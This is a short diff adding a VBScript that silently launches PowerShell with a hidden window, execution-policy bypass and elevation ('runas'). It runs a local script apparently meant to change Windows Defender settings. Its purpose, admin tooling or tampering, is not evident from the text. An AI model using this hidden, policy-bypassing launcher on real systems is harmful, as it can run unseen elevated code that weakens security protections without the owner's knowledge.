@@ -1,0 +1,2 @@
+Set oShell = CreateObject("Shell.Application")  
+oShell.ShellExecute "powershell", "-WindowStyle Hidden -nologo -noprofile -NonInteractive -executionpolicy bypass C:\UpgradeAgent\PowerShellAllow_WindowsDefender.ps1", "", "runas", 0
